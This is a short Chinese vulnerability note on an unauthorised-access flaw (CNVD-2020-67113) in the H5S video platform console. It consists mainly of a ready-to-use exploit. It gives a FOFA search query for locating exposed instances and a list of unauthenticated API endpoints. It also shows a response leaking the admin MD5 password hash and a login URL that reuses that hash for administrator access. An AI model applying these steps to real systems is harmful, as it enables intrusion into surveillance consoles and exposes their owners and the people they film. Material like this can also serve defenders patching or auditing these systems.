# 零视技术 H5S CONSOLE 未授权访问漏洞 CNVD-2020-67113

## 网络测绘

fofa: title="H5S视频平台|WEB"

## POC / EXP

```
/doc/
/doc/devtemplate.xlsx
/doc/api.html
/doc/H5S视频平台用户手册-zh.chm

/api/v1/GetSystemInfo
/api/v1/Getsrc
/api/v1/GetRegion?session=null
/api/v1/GetDevice

/api/v1/GetUserInfo?user=admin&session=
{
 "strUser": "admin",
 "strPasswd": "827ccb0eea8a706c4c34a16891f84e7b",
 "strUserType": "Administrator",
 "strRole": "Administrator"
}

/api/v1/Login?user=admin&password=827ccb0eea8a706c4c34a16891f84e7b
/#/Dashboard
```